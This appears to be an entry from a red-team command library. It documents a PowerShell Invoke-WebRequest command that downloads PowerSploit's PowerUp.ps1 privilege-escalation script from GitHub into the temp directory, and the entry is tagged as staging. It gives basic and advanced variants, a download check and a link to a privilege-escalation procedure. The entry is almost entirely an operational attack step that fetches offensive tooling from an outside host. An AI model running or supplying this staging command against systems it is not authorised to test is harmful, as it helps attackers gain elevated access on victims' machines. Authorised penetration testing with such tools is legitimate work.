---
type: command
executor: powershell
data: >-
  Invoke-WebRequest -Uri
  'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1'
  -OutFile "$env:TEMP\PowerUp.ps1"
output: null
platforms:
  - Windows
tags:
  - download
  - staging
  - enumeration
verified: true
validated: true
---

# download-powerup-ps1-script

## Command

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1' -OutFile "$env:TEMP\PowerUp.ps1"
```

## Description

This command downloads the PowerUp.ps1 privilege escalation enumeration script directly from its GitHub repository to the system's temporary directory using PowerShell's Invoke-WebRequest cmdlet. It stages the tool for local execution without needing external download utilities like curl or wget.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-Uri` | The URL of the PowerUp.ps1 script to download (fixed to GitHub source) | Yes |
| `-OutFile` | The local path where the script will be saved (defaults to temp directory) | Yes |

## Examples

### Basic Usage

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1' -OutFile "$env:TEMP\PowerUp.ps1"
```

### Advanced Usage

```powershell
Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Privesc/PowerUp.ps1' -OutFile 'C:\Temp\PowerUp.ps1' -UseBasicParsing
```

## Expected Output

No console output on success; the script is downloaded silently. Verify the download with:

```powershell
Test-Path "$env:TEMP\PowerUp.ps1"
```

This should return `True` if the file exists.

## Related

- [[tools/PowerUp]]
- [[procedures/Enumerate-Windows-for-Privilege-Escalation-Using-PowerUp]]
